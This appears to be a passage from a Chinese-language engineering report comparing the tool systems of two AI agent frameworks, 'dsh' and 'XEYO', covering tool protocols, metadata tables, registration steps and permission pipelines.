- **四条正交关注点被塞进了同一个接口**：模型可见 schema（`ToolSchema`）、执行（`execute`）、模型可见内容后处理（`finalizeContent`）、UI 呈现（`presentCall`/`presentResult`）。这是"一个工具 = 一个包"能成立的前提。
- 变体：PowerShell 走独立 `tool-pwsh`；PTY 持久会话 `tool-bash-persistent`/`tool-pwsh-persistent`；流式进度走事件，不另立 execute 变体。

###### 7.2 XEYO：Tool Protocol + 单表元数据

```python
# python/tools/base_tool.py:23-43
@runtime_checkable
class Tool(Protocol):
    name: str
    def schema(self) -> dict: ...
    async def execute(self, input, abort) -> ToolResult: ...
    @staticmethod
    def is_read_only() -> bool: ...
    @staticmethod
    def is_concurrency_safe() -> bool: ...
```

- `ToolResult` dataclass（`base_tool.py:9-21`）= `content / is_error / todos / images / metadata / ui`。
- **元数据单表** `TOOL_META`（`tools/meta.py:24-48`）：`read_only / concurrency_safe / policy / subagent_ok / output_budget / exposure`。作者在表头的定位（`meta.py:1-4`）：「工具元数据单表 — policy / catalog / subagent / schema 短描述的唯一来源。新增工具：在此登记一行，再在 catalog 挂工厂；**勿再手抄 READONLY / 白名单**。」
- **schema 手写**：各工具 `schema()` 直接返回 dict（手写 JSON Schema），无 DSL、无编译期校验。
- **`exposure` 字段**是 dsh 没有的概念：`meta.py:76-78` 的 `hidden` 用于 L3 offload 工具——**注册进注册表但不进主 schemas**，模型只能通过 offload_read 回读。

###### 7.3 注册与生命周期

| | dsh | XEYO |
|---|---|---|
| 注册 API | `ctx.tools.register(definition)`（`index.ts:1028-1053`） | `ToolRegistry.register`（`tool_registry.py:103-105`） |
| 生命周期 | 经 `this.layers.effect(...)`，**返回 disposer，卸载自动解绑** | 进程启动时一次性注册，无常驻增删 |
| 作用域 | scoped 工具 **shadow** globals（`view()` 逐层合并，`index.ts:1144-1186`）；`restrict()`/`guard()` 同机制（`:1062-1107`） | 全局单表 |
| 组合 | bundle/profile + `cordis.patch.yml` | `catalog.py` 的 `ENABLED_TOOL_ENTRIES`（`:261-287`）+ `XEYO_BENCH_MINIMAL` 裁剪（`:359-370`） |
| 缓存 | 无（`view()` 每次派生） | `_schemas_cache`，会话内冻结 |
| 启动自检 | `verify-tool-catalog` 机器执法 | `_register_factories` 硬失败（`catalog.py:308-352`）+ `_assert_names` 保证 ENABLED == meta.enabled（`:485-492`） |

**加一个工具的 SOP 对照**

dsh（5 步）：
1. 新建 `packages/<组>/<tool>/src/index.ts`，`defineTool({...})` 并实现 `output`；
2. 包内 `ctx.tools.register(...)`；
3. 需要系统提示段则写 `prompt.ts` 经 `ctx.systemPrompt` 注册；
4. 在目标 bundle 的 `cordis.patch.yml` 挂载该包；
5. 更新 `docs/tool-catalog.md`（`verify-tool-catalog` 执法）。

XEYO（4 步）：
1. `tools/<name>_tool/` 实现 `Tool` 协议（`schema()` + `execute()`）；
2. `meta.py` 的 `TOOL_META` 登记一行；
3. `catalog.py` 的 `ENABLED_TOOL_ENTRIES` 加 `(name, _factory)`；
4. 启动自检会强制"名 / flag / meta / enabled"四者对齐，不对齐**硬失败**。

**设计意味**：dsh 的第 4 步（bundle patch）是"可组合性"的体现——同一个工具包，不同 profile 可以选择装或不装；XEYO 的第 3 步是"枚举式启用"——所有可用工具写死在一个列表里，靠常量裁剪。

###### 7.4 设计分歧

| 维度 | dsh | XEYO |
|---|---|---|
| 结果结构化 | `output.schema` 一等公民 + `render` 投影 | `metadata` 松散承载 |
| UI 呈现 | 工具自带 `presentCall/presentResult` | GUI 侧按 `toolActivity.ts` 动态生成 |
| 超时 | `timeoutMs` per-tool，`timeout-policy` 包装 | **无 per-tool 超时**，只有 AbortController |
| 缓存/冻结 | 无，实时派生 | `_schemas_cache` 会话内冻结（红线） |
| 隐藏工具 | 无等价概念 | `exposure="hidden"`（offload L3） |

---


> 来源：**R3 实现面·实现级对比** · 原节「7. 工具系统：实现级」（源 L714–890）

##### 7. 工具系统：实现级

###### 7.1 dsh `ToolDefinition`：逐字段

**文件**：`packages/core/tools/src/index.ts`（1937 行）+ `types.ts`

`ToolDefinition` 的字段（从 `:200-280` 与 `schema.ts` 交叉读取，逐项列出）：

| 字段 | 类型 | 语义 |
|---|---|---|
| `name` | string | 模型可见名 |
| `description` | string | 模型可见描述 |
| `parameters` | JSON Schema | **入参 schema（原始 JSON Schema，非 zod 推导）** |
| `execute` | `(args, ctx: ToolRunContext) => Promise<ToolExecutionResult>` | 工具体 |
| `timeoutMs` | number? | per-tool 超时（`guard/timeout-policy` 读它） |
| `isConcurrencySafe` | `(args) => boolean`? | 可否加入并行组（调度器 `executionMode` 用） |
| `presentCall` | `(args) => ToolCallView \| undefined`? | **PENDING 态 UI 呈现**（纯函数，可回放） |
| `presentResult` | `(args, result: ToolResult) => ToolResultView \| undefined`? | **完成态 UI 呈现**（纯函数，可回放） |
| 输出投影 | 由 output 声明 | 产出 `ToolResult.meta`（durable，UI 回放用） |

**`presentCall` / `presentResult` 的注释是实现级金句**（`:262-279`）：

> Pure and side-effect-free: a UI may call it during live streaming AND a session-log replay, so it must depend only on `args`.

——即 dsh 要求 UI 呈现是**历史的纯函数**，这是「日志回放能复原卡片」的实现前提。

**`ToolExecutionResult` 家族**（从 `tool-calls.ts:153-158` 与 `:424-436` 反推 + `types.ts`）：成功态带 `content: ContentBlock[]`、`isError`、可选 `error: {message, info}`、可选 `meta`、可选 `additionalContexts: UserMessage[]`、**`concludesTurn?: boolean`**（唯一能终止 turn 的标记）。

**`ToolImplementation` 的入参跨一个「无损 JSON 物化边界」**（`:365-371` 注释）：parsed arguments 在进 policy 前**物化一次并无损化**，然后 **deep-frozen**；`callId` / caller signal / registry 分配的 `token` 全部 readonly；registry 在 `tools/result` observer 跑之前**冻结整个对象**。

###### 7.2 dsh `ToolRuntime`：四阶段可调度接口

```ts
// index.ts:444-453
export interface ToolRuntimeScheduler {
  prepare(exec: ToolExecutionInput): Promise<ScheduledToolPreparation>   // 物化 + 有序 pre-execute/guard 门
  dispatch(exec: ToolRunContext): Promise<ScheduledToolDispatch>          // 仅 around-dispatch/body
  finalize(exec: ToolRunContext, result: ToolExecutionResult): Promise<ToolExecutionResult>  // post-execute + 内容定稿 + 通知
  finish(exec: ToolRunContext, result: ToolExecutionResult): ToolExecutionResult              // 跳过 post-execute
}
```

**`prepare` 的三态返回**（`:424-427`）：

```ts
| { kind: 'dispatch'; exec: ToolRunContext }                                // 正常进 body
| { kind: 'post-result'; exec; result }                                     // 已判结果，但仍要走 post-execute
| { kind: 'final-result'; exec; result }                                    // 已终局，跳过 post-execute
```

**这条三分支是实现级的关键**：**`post-result` vs `final-result` 的区别就是「post-execute 瀑布还能不能改写」**——调度器据此避免无谓的异步等待（`tool-calls.ts:187-192` 直接占槽）。

**扩展点（waterfall）实测**：
- `'tools/pre-execute'`（`:144`）：`(exec, next) => Promise<PreToolDecision>`，**scope-filtered**（带 `this: Scoped<ToolRuntime>`）。
- `'tools/post-execute'`（`:167`）：`(exec, result, next) => Promise<PostToolDecision>`。
- `register(definition)`（`:1028`）：返回 disposer。
- **单调 guard**（`:697`, `:1092` 注释）：在**每次 `tools/pre-execute` 之后**求值——这是「守卫」与「拦截器」的分层实现。
- `executionMode(exec)`（`:1267`）：返回 `{kind:'parallel'|'exclusive'}`。
- `post-execute` 的两个显式不变量（`:1749`, `:1757`）：**「accept 决策不能同时替换 value 与 content」**、**「不能替换已失败结果的值」**——都是 `TypeError` 而非静默。

###### 7.3 dsh schema 生成：多语言类型桥

`packages/core/tools/src/` 里有一组**按语言分文件的类型桥**，实测：

| 文件 | 行数 | 作用 |
|---|---|---|
| `json-schema.ts` | 656 | JSON Schema 定义/工具 |
| `schema.ts` | 617 | schema 装配 |
| `py-types.ts` | 818 | **Python 类型桥** |
| `ts-types.ts` | 317 | TS 类型桥 |
| `ptc.ts` | 678 | PTC（程序化工具调用）模式 |
| `presentation.ts` | 389 | 呈现层 |
| `testing.ts` | 42 | 测试辅助 |

`py-types.ts`（818 行）与 `ts-types.ts` 的存在说明：dsh 的 schema 是**给多语言运行时用的类型描述**（PTC 模式下模型写代码调工具，需要在目标语言里有类型声明）。而发给 LLM 的 wire 形状在 `llm/src/types.ts:399-403`：

```ts
export interface ToolSchema { name: string; description: string; parameters: Record<string, unknown> }
```

**接口注释说明了归属**（`:392-397`）：ToolSchema 声明在 `dsh-llm` 而不是 `dsh-tools`，因为它属于 `GenerateOptions`；`ToolDefinition` 与 `PromptAssembly` 都从这里 import。

###### 7.4 dsh 工具目录：62 行 / 66 个工具名（实测）

`docs/tool-catalog.md` 是**生成物**（`scripts/gen-tool-catalog.ts`），生成方式本身是实现级细节：

> Unlike the cordis catalog (a pure source-AST pass), this generator **BOOTS each tool plugin on a real context and reads `ctx.tools.schemas()`**, because a tool schema is not statically knowable (runtime-spread enums, concatenated descriptions, config-driven names, raw-JSON-Schema MCP tools). A completeness guard globs `packages/*/tool-*` and **fails if any package is missing** from the generator's boot manifest.

**实测 62 行 / 66 个工具名**（含重名与别名）：

| 分组 | 工具名 |
|---|---|
| 交互 | `ask_user_question`, `exit_plan_mode` |
| 代码运行时 | `run_code` |
| Shell | `bash`, `pwsh`（一次性）+ `bash`/`pwsh`（persistent PTY 版同形） |
| 自修改 | `cordis_define`, `cordis_inspect_list`, `cordis_inspect_query`, `cordis_inspect_self`, `cordis_run`, `cordis_stop`, `cordis_undefine`（**7 个**） |
| 文件 | `edit`, `read`, `read_image`, `write`, `str_replace_editor` |
| 检索 | `glob`, `grep` |
| 终端 | `terminal_close`, `terminal_list`, `terminal_open`, `terminal_read`, `terminal_send`, `terminal_signal`（6 个） |
| 目标 | `create_goal`, `get_goal`, `update_goal` |
| 调度 | `schedule_create`, `schedule_delete`, `schedule_list` |
| LSP | `lsp` |
| 工作流 | `ralph`, `workflow` |
| 技能 | `skill` |
| 会话自查询 | `session_event_read`, `session_event_search`, `session_event_trace`, `session_search`, `session_trace`（**5 个**） |
| 子代理 | `subagent`, `subagent_fork`, `list_subagent_models`, `interrupt_agent`, `list_agents`, `send_message` |
| 作业 | `job_kill`, `job_list`, `job_output` |
| Agent Teams（experimental） | `spawn_teammate`, `team_task_create`, `team_task_get`, `team_task_list`, `team_task_update`, `wait_agent` |
| 待办 | `todo_write` |
| Web | `web_fetch`, `web_search` |

###### 7.5 XEYO `ToolMeta`：单表 26 项

**文件**：`python/tools/meta.py`（414 行）。模块 docstring 直接写定位（`:1-4`）：

> 工具元数据单表 — policy / catalog / subagent / schema 短描述的唯一来源。新增工具：在此登记一行，再在 catalog 挂工厂；**勿再手抄 READONLY / 白名单**。

`ToolMeta` 是 frozen dataclass，**14 个字段**：

```python
@dataclass(frozen=True)
class ToolMeta:
    name: str
    read_only: bool
    concurrency_safe: bool
    policy: PolicyKind                                  # 8 值
    subagent_ok: bool = False                           # 可否出现在子 agent 注册表
    subagent_baseline: bool = False                     # 子 agent 默认基线白名单
    needs_write_store: bool = False
    needs_read_state: bool = False
    needs_runtime_provider: bool = False
    repeat_exempt: bool = False
    short_description: str = ""                         # 发给模型的短描述（省 schema token）
    enabled: bool = True                                # False = 仅策略/测试用（如 echo）
    output_budget: int | None = None                    # T1 per-tool 输出预算（字符）
    exposure: Literal["normal", "hidden"] = "normal"     # F2：hidden 不进 schemas 但保留注册
```

`PolicyKind = Literal["always_allow","outbound_ask","ui_ask","read_path","write_path","agent_allow","bash","interactive"]`（`:14-22`）——**8 种策略类型**，是 policy 层分流的唯一键。

**三个实现级注释值得记**：
- `output_budget`：`None` = 默认 16000 字符；`0` = 豁免（自带截断或防读回环，如 Bash 自带 spill、Read 防 read→spill→read）；
- `exposure`：`hidden` = 不进 schemas 但**保留注册**，「模型幻觉调用仍走权限三态，fail-safe」；
- `short_description`：空则保留工具自带全文。

**实测 26 个工具条目**：

| 工具 | policy | 备注 |
|---|---|---|
| `echo` | always_allow | `enabled=False`（仅测试） |
| `getTime` | always_allow | read_only |
| `offload_read` | read_path | **`exposure="hidden"`**（hidden-but-registered） |
| `Glob` / `Grep` / `Read` | read_path | read_only |
| `Write` / `Edit` | write_path | |
| `Bash` | bash | |
| `TodoWrite` | always_allow | |
| `Screenshot` / `SendToWeChat` / `XeyoUI` | ui_ask / outbound_ask | |
| `Memory` | write_path | policy 里特判为 `memory_tool_confined` → ALLOW |
| `AskUserQuestion` | interactive | |
| `JournalQuery` / `Diagnostics` / `Git` / `NotebookEdit` | 读或写 | |
| `Skill` / `Agent` | agent_allow | |
| `WebFetch` / `WebSearch` | outbound_ask | |
| `job_output` / `job_list` / `job_kill` | — | 作业控制三件套（与 dsh 同名） |

###### 7.6 加一个工具的 SOP（两端对照）

| 步骤 | dsh | XEYO |
|---|---|---|
| 1 | 新建 `packages/*/tool-<name>/src/index.ts`，`defineTool({name, description, parameters, execute, presentCall?, presentResult?})` | 在 `python/tools/meta.py` 登记一行 `ToolMeta(...)` |
| 2 | 在插件 `apply()` 里 `ctx.tools.register(def)`，用 `ctx.effect` 管 disposer | 在 `python/tools/catalog.py` 挂工厂 |
| 3 | 在 profile 的 `cordis.patch.yml` 或 preset 里挂上插件 | 工具进 `ENABLED_TOOLS`（`enabled=True`/`exposure="normal"`） |
| 4 | 跑 `pnpm run gen-tool-catalog` 重生成文档；**completeness guard 会因缺文档失败** | 跑 `tests/test_t_now_block_registry.py` 无关；但 **`catalog.py` 的 schema 与 `meta.py` 单表一致**由测试保证 |
| 5 | 写 spec；**per-file 100% 覆盖率门** | 写 pytest |
| 守卫 | 完成时 `verify-tool-catalog` 会检查新增 `packages/*/tool-*` 是否都进文档 | 无「新工具必须文档化」的机器门（靠 AGENTS.md 约定） |

---


> 来源：**R4 枚举面·逐字段级对比** · 原节「§2 工具协议：逐字段」（源 L251–423）

##### §2 工具协议：逐字段

###### 2.1 dsh —— ToolSchema 与内容块

**发给 LLM 的 schema 形状（`llm/llm/src/types.ts`）**

```ts
export interface ToolSchema {
  name: string
  description: string
  parameters: Record<string, unknown>   // JSON Schema
}
```

**只有 3 个字段**。dsh 的 schema 从 `packages/core/tools/src/{json-schema,schema,ptc,ts-types,py-types}.ts` 生成——`ts-types.ts` / `py-types.ts` 的存在说明它能从 **TS 类型或 Python 类型**推导 schema，而 `json-schema.ts` 是手写路径。三条路径并存（本轮未逐行读这三个文件，属"未见细节"）。

**`ContentBlock` 6 变体逐字段**

| 变体 | 字段 |
|---|---|
| `TextBlock` | `type: 'text'`, `text: string` |
| `ReasoningBlock` | `type: 'reasoning'`, `text: string` |
| `ImageBlock` | `type: 'image'`, `attachment: ImageAttachmentRef` |
| `FileBlock` | `type: 'file'`, `attachment: FileAttachmentRef` |
| `ToolCallBlock` | `type: 'tool-call'`, `id: ToolCallId`, `name: string`, `arguments: string` |
| `ToolResultBlock` | `type: 'tool-result'`, `toolCallId: ToolCallId`, `content: ContentBlock[]`, `isError?: boolean` |

**`FinishReason` 5 变体**：`stop` / `tool-calls` / `max-tokens` / `aborted{failure: LlmFailure}` / `error{failure: LlmFailure}`。

**`TokenUsage` 6 字段**：`inputTokens`, `outputTokens`, `totalTokens?`, `cacheReadTokens?`, `cacheWriteTokens?`, `reasoningTokens?`。

**`LlmFailure` 5 字段**：`message`, `code`, `status?`, `providerRetryAfterMs?`, `requestId?`。

**`StreamChunk` 7 变体（流式协议逐条）**

```ts
export type StreamChunk =
  | { type: 'block-start';     index: number; blockType: ContentBlockType }
  | { type: 'text-delta';      index: number; text: string }
  | { type: 'reasoning-delta'; index: number; text: string }
  | { type: 'tool-call-delta'; index: number; id: ToolCallId; name?: string; argumentsDelta: string }
  | { type: 'block-end';       index: number; block: ContentBlock }
  | { type: 'usage';           usage: TokenUsage }
  | { type: 'finish';          reason: FinishReason; replayState?: ReplayEnvelope }
```

**关键设计**：dsh 的流是**显式块生命周期**（`block-start` → 若干 delta → `block-end`），且 `finish` 带 `replayState`（可重放封套）。XEYO 的 provider 流是隐式累积（无 block-start/end，见 §10）。

**`GenerateOptions` 逐字段**：`provider`, `model`, `reasoningEffort?`, `messages`, `system?`, `tools?: ToolSchema[]`, `temperature?`, `maxTokens?`, `stop?: string[]`, `signal?: AbortSignal`, `sessionId?`。

###### 2.2 XEYO —— `ToolMeta` 14 字段 + 26 工具全表

**`ToolMeta` 逐字段（`python/tools/meta.py:24-48`）**

| # | 字段 | 类型 | 默认 | 语义（原文注释） |
|---|---|---|---|---|
| 1 | `name` | `str` | 必填 | 工具名 |
| 2 | `read_only` | `bool` | 必填 | — |
| 3 | `concurrency_safe` | `bool` | 必填 | 可否并发执行 |
| 4 | `policy` | `PolicyKind`（8 值） | 必填 | 权限策略类 |
| 5 | `subagent_ok` | `bool` | `False` | 可否出现在子 agent 注册表（False → 禁发） |
| 6 | `subagent_baseline` | `bool` | `False` | 子 agent 默认基线白名单 |
| 7 | `needs_write_store` | `bool` | `False` | — |
| 8 | `needs_read_state` | `bool` | `False` | — |
| 9 | `needs_runtime_provider` | `bool` | `False` | — |
| 10 | `repeat_exempt` | `bool` | `False` | 重复检测豁免 |
| 11 | `short_description` | `str` | `""` | 发给模型的短 description（省 schema token）；空则保留工具自带全文 |
| 12 | `enabled` | `bool` | `True` | False = 仅策略/测试用（如 echo），不进 `ENABLED_TOOLS` |
| 13 | `output_budget` | `int \| None` | `None` | T1 per-tool 输出预算（字符）：None=默认 **16000**；**0=豁免**（自带截断或防读回环） |
| 14 | `exposure` | `Literal["normal","hidden"]` | `"normal"` | F2：hidden = 不进 schemas 但保留注册（幻觉调用仍走权限三态，fail-safe） |

**`PolicyKind` 8 值**（`:12-21`）：`always_allow` / `outbound_ask` / `ui_ask` / `read_path` / `write_path` / `agent_allow` / `bash` / `interactive`

**26 工具逐字段全表（唯一登记表 `TOOL_META`，`:53-312`）**

| # | name | 行 | read_only | conc_safe | policy | sub_ok | baseline | write_store | read_state | runtime_prov | repeat_exempt | enabled | out_budget | exposure |
|---|---|---|---|---|---|---|---|---|---|---|---|---|---|
| 1 | `echo` | 57 | ✅ | ✅ | always_allow | | | | | | | **❌** | | |
| 2 | `getTime` | 65 | ✅ | ✅ | always_allow | | | | | | | ✅ | | |
| 3 | `offload_read` | 72 | ✅ | ✅ | read_path | | | | | | | ✅ | | **hidden** |
| 4 | `Glob` | 80 | ✅ | ✅ | read_path | ✅ | ✅ | | | | | ✅ | | |
| 5 | `Grep` | 92 | ✅ | ✅ | read_path | ✅ | ✅ | | | | | ✅ | | |
| 6 | `Read` | 104 | ✅ | ✅ | read_path | ✅ | ✅ | | ✅ | | | ✅ | **0** | |
| 7 | `Write` | 117 | ❌ | ❌ | write_path | ✅ | ✅ | ✅ | ✅ | | | ✅ | | |
| 8 | `Edit` | 128 | ❌ | ❌ | write_path | ✅ | ✅ | ✅ | ✅ | | | ✅ | | |
| 9 | `Bash` | 139 | ❌ | ❌ | bash | ✅ | ✅ | | | | | ✅ | **0** | |
| 10 | `TodoWrite` | 157 | ❌ | ❌ | always_allow | | | | | | | ✅ | | |
| 11 | `Screenshot` | 163 | ❌ | ❌ | outbound_ask | | | | | | | ✅ | | |
| 12 | `SendToWeChat` | 170 | ❌ | ❌ | outbound_ask | | | | | | | ✅ | | |
| 13 | `Memory` | 178 | ❌ | ❌ | write_path | **❌** | | | | | | ✅ | | |
| 14 | `AskUserQuestion` | 186 | ✅ | ❌ | interactive | | | | | | **✅** | ✅ | | |
| 15 | `JournalQuery` | 193 | ✅ | ✅ | always_allow | ✅ | ✅ | | | | | ✅ | | |
| 16 | `Skill` | 202 | ✅ | ✅ | always_allow | ✅ | ❌ | | | | | ✅ | | |
| 17 | `Agent` | 211 | ❌ | ✅ | agent_allow | **❌** | | ✅ | | **✅** | | ✅ | | |
| 18 | `Diagnostics` | 224 | ✅ | ✅ | read_path | ✅ | ✅ | | | | | ✅ | | |
| 19 | `Git` | 235 | ✅ | ✅ | always_allow | ✅ | ✅ | | | | | ✅ | | |
| 20 | `NotebookEdit` | 244 | ❌ | ❌ | write_path | ✅ | ❌ | ✅ | ✅ | | | ✅ | | |
| 21 | `WebFetch` | 255 | ❌ | ❌ | outbound_ask | **❌** | | | | | | ✅ | | |
| 22 | `WebSearch` | 263 | ❌ | ❌ | outbound_ask | **❌** | | | | | | ✅ | | |
| 23 | `XeyoUI` | 271 | ❌ | ❌ | ui_ask | **❌** | | | | | | ✅ | | |
| 24 | `job_output` | 283 | ✅ | ✅ | always_allow | | | | | | **✅** | ✅ | | |
| 25 | `job_list` | 294 | ✅ | ✅ | always_allow | | | | | | | ✅ | | |
| 26 | `job_kill` | 301 | ❌ | ❌ | always_allow | **❌** | | | | | | ✅ | | |

**14 个派生集合（`:367-411`，全部由单表计算，禁止手抄）**

`ALWAYS_ALLOW_TOOLS` / `OUTBOUND_ASK_TOOLS` / `UI_ASK_TOOLS` / `READ_PATH_TOOLS` / `WRITE_PATH_TOOLS` / `READONLY_ALLOW` / `READONLY_ASK_ALLOW` / `SUBSET_TOOL_BASELINE` / `FORBIDDEN_SUB_TOOLS` / `REPEAT_EXEMPT_TOOLS` / `WRITE_STORE_TOOL_NAMES` / `READ_STATE_TOOL_NAMES` / `RUNTIME_PROVIDER_TOOL_NAMES` / `ENABLED_META_NAMES`，外加兼容别名 `SUBSET_TOOL_WHITELIST = SUBSET_TOOL_BASELINE`。

**注册期硬失败校验（`tools/catalog.py`，4 条）**

| 校验 | 失败后果 |
|---|---|
| 工厂产出名 ≠ 声明名 | `tool factory name mismatch` |
| meta 缺失或 `enabled=False` | `enabled tool missing from tools.meta` |
| 标了 `needs_read_state` 但无 `set_read_file_state` | RuntimeError |
| 实例 `is_read_only()` ≠ `meta.read_only` | RuntimeError |
| 实例 `is_concurrency_safe()` ≠ `meta.concurrency_safe` | RuntimeError |

即 **meta 表是唯一真相，实例与表漂移在注册期就炸**——这是 XEYO「机器执法」在工具面的体现。

**`XEYO_BENCH_MINIMAL=1` 的裁剪集（`catalog.py`）——18 个工具**

```python
excluded = {
    "Skill", "Agent", "Memory", "AskUserQuestion",
    "Read", "Write", "Edit", "Glob", "Grep", "NotebookEdit",
    "Screenshot", "SendToWeChat", "XeyoUI", "JournalQuery",
    "Diagnostics", "Git", "WebFetch", "WebSearch",
}
```

保留 **8 个**：`echo`(禁用也不进) / `getTime` / `offload_read` / `Bash` / `TodoWrite` / `job_output` / `job_list` / `job_kill`。→ 实测保留的启用工具 = **7 个**（`getTime`, `offload_read`, `Bash`, `TodoWrite`, `job_output`, `job_list`, `job_kill`）。

###### 2.3 dsh —— 57 个唯一工具名（按能力域分组）

| 域 | 工具名 | 实现包 |
|---|---|---|
| 文件 | `read`, `read_image`, `write`, `edit`, `str_replace_editor`, `glob`, `grep` | `tool-fs`, `tool-fs-search`, `tool-str-replace-editor` |
| 执行 | `bash`, `pwsh`（各含 local + persistent 变体） | `tool-bash`, `tool-pwsh`, `tool-bash-persistent`, `tool-pwsh-persistent` |
| 终端 | `terminal_open`, `terminal_read`, `terminal_send`, `terminal_signal`, `terminal_list`, `terminal_close`（**6 个**） | `tool-terminal` |
| 代码 | `run_code` | `dsh-tools` |
| 自修改 | `cordis_define`, `cordis_undefine`, `cordis_run`, `cordis_stop`, `cordis_inspect_list`, `cordis_inspect_query`, `cordis_inspect_self`（**7 个**） | `tool-cordis` |
| 会话自查询 | `session_event_read`, `session_event_search`, `session_event_trace`, `session_search`, `session_trace`（**5 个**） | `tool-session-query` |
| 子代理 | `subagent`, `list_subagent_models`, `interrupt_agent`, `list_agents`, `send_message` | `tool-subagent`, `tool-subagent-control` |
| 团队（实验） | `spawn_teammate`, `team_task_create`, `team_task_get`, `team_task_list`, `team_task_update`, `wait_agent` | `experimental-tool-agent-team` |
| 后台 | `job_list`, `job_output`, `job_kill` | `tool-jobs` |
| 计划/待办 | `exit_plan_mode`, `todo_write`, `create_goal`, `get_goal`, `update_goal` | `plan-mode`, `tool-todo`, `tool-goal` |
| 调度 | `schedule_create`, `schedule_delete`, `schedule_list` | `schedule` |
| 其他 | `ask_user_question`, `skill`, `lsp`, `web_fetch`, `web_search`, `workflow`, `ralph` | `tool-ask-user`, `tool-skill`, `tool-lsp`, `tool-web`, `tool-workflow`, `tool-ralph` |

**XEYO 26 vs dsh 57 的工具面差异（域级）**

| 域 | XEYO | dsh |
|---|---|---|
| 文件 | Read/Write/Edit/Glob/Grep/NotebookEdit（6） | read/read_image/write/edit/str_replace_editor/glob/grep（7） |
| 执行 | Bash（1） | bash/pwsh ×（local+persistent）= 4 |
| 持久终端 | ❌ | **6 个 terminal_\*** |
| 代码运行 | ❌ | `run_code` |
| 自修改插件 | ❌ | **7 个 `cordis_*`** |
| 会话自查询 | ❌ | **5 个 `session_*`** |
| 子代理 | Agent（1） | subagent + 4 控制工具 |
| 团队 | ❌ | **6 个 team_\***（实验） |
| 后台任务 | job_output/job_list/job_kill（3） | 同名 3 个 |
| 计划/goal | ❌（plan 走 mode，无工具） | exit_plan_mode + 3 个 goal 工具 |
| 定时 | ❌ | **3 个 schedule_\*** |
| LSP | Diagnostics（1，自陈"Not a full LSP"） | `lsp` |
| 网络 | WebFetch/WebSearch | web_fetch/web_search |
| 桌面/外发 | Screenshot/SendToWeChat/XeyoUI（**3 个，dsh 完全没有**） | ❌ |
| 其他 XEYO 独有 | echo/getTime/offload_read/TodoWrite/Memory/AskUserQuestion/JournalQuery/Skill/Git | — |
| 其他 dsh 独有 | skill/ask_user_question/workflow/ralph | — |

---


## 域 10 · 工具执行管线

> 来源：**R1 功能面·全量对比** · 原节「9. 工具执行管线」（源 L261–276）

##### 9. 工具执行管线

###### dsh（`docs/tool-execution-pipeline.md` + `core/tools/src/index.ts`）
`tool/call` → **`tools/pre-execute`**（hooks + permission + sandbox 判定，waterfall）→ 单调 guards → **`tools/execute`**（超时/重试/指标，可包装）→ tool body → `fs/write-intent`/`fs/edit-intent` → **`tools/post-execute`** → `finalizeContent` → **`tools/result`**（观察者）→ `tool/result` 事件。
- 事件定义：`index.ts:144/155/167/189`。
- 不变量：`tools/result` 发布前 exec 与 outcome 必须 **frozen**（`invariant.ts:23-28`）。

###### XEYO
`_admit_tool_use`（配额 + 只读早并发）→ `run_tools_partitioned` → `tool.execute(input, abort)`（`tool_registry.py:149`）→ `store.append(tool_result_message)` + SSE。
- 权限判定在 `permissions/policy.py:evaluate_policy`（`:1319`），工具侧只看到 `Permission denied: {reason}`（中性结果型，`tool_registry.py:453-459`）。
- 插件 hooks（`extension/hooks.py`）挂在工具门禁接缝，默认关。

**差异**：dsh 的管线是**命名事件瀑布**（任何插件可插在 4 个点位）；XEYO 是**函数内联 + 一个 hook 接缝**。dsh 的可拦截性高一个量级。

---


> 来源：**R2 设计面·设计级对比** · 原节「8. 工具执行管线」（源 L523–587）

##### 8. 工具执行管线

###### 8.1 dsh：命名事件瀑布，4 个可拦截点

`docs/tool-execution-pipeline.md` + `core/tools/src/index.ts`：

```
tool/call（事件） → presentCall（UI）
  → tools/pre-execute  (waterfall: hooks + permission + sandbox + ctx.approval 挂起)
  → 单调 guards        (tools.guard，deny/abstain，身份受保护)
  → tools/execute      (waterfall: timeout / retry / metrics 包装) → tool body
                                                → fs/write-intent | fs/edit-intent
  → tools/post-execute (waterfall: accept / block / replace / add context)
  → finalizeContent
  → tools/result       (观察者，frozen)
  → tool/result（事件）
```

- 事件定义：`index.ts:144 / 155 / 167 / 189`。
- **不变量**：`tools/result` 发布前 exec 与 outcome 必须 **frozen**（`invariant.ts:23-28`）。
- **可拦截点 = 4 个 waterfall + 单调 guards + `ctx.approval`**。任何第三方插件可以在不碰工具实现的前提下：改参数、拒执行、改结果、加补充上下文、加超时。
- 作者对权限归属的显式设计（`shell/tool-bash/src/index.ts:6-7`）：`TODO(permissions): deployment policy belongs in tools/pre-execute and sandboxing executors`——**权限属于管线，不属于工具**。

###### 8.2 XEYO：函数内联链 + 单钩子接缝

```
_admit_tool_use（占配额 / early 只读并发 / flush transcript）      query_loop.py:1047
  ↓ chunk.kind=="tool_use"                                       query_loop.py:1155-1157
tool_registry.run                                                  tool_registry.py:296
  ├ readonly_gate
  ├ PreToolUse 钩子（extension/hooks.py，默认关）
  ├ evaluate_policy → ALLOW / Bash 路由 / DENY / ASK
  ├ _execute_audited（写 tool.started / tool.finished 审计）
  ├ _apply_output_budget（超 16000 落 spill）
  └ PostToolUse 钩子
  ↓
store.append(tool_result_message) → SSE
```

- 权限判定在 `permissions/policy.py:evaluate_policy`（`:1319`）；工具侧只看到中性结果型错误 `Permission denied: {reason}`（`tool_registry.py:453-459`）。
- 作者对"策略先于工具"的纪律（`tool_registry.py:148`）：「策略层已 ALLOW / skip_ask：工具内 check_permissions 不得再把 ASK 降成 DENY。」

**旁路清单**（这是 XEYO 结构上最需要警惕的一面）：

| 旁路 | 位置 | 绕过了什么 |
|---|---|---|
| `server/workspace_fs.py` 直写 | `workspace_fs.py:39-42`（需 `XEYO_WORKSPACE_FS_WRITABLE=1`） | 不穿权限、不穿 rewind，仅 `workspace_fs.{action}` 审计（`:44-56`） |
| 后台 bash job | `bash_tool.py:588-622` → `server/job_registry.py` | 拿到 job id 后脱离 tool-call 信号独立运行 |
| `offload_read` + `spill.py` 外部化 | `tools/spill.py`、`meta.py:76-78` | 结果不进主 schemas，走 L3 隐藏工具回读 |
| Bash 改文件 | `bash_tool.py:57-112` | 第二条写盘路径，靠 `_invalidate_search_caches` 补救 |

作者对旁路的态度是**明确的**（`workspace_fs.py:35-38`）：「默认拒绝写入…必须由用户显式开启才能承担写/删风险」——即：知情地承认旁路存在，用开关而不是用架构封死。

###### 8.3 设计分歧

| 维度 | dsh | XEYO |
|---|---|---|
| 管线形态 | 命名 waterfall（可拦截、可观测、可测） | 函数内联 + 1 个钩子接缝 |
| 可拦截点 | 4 + guards + approval | 3（Pre/Post/PermissionRequest，默认关） |
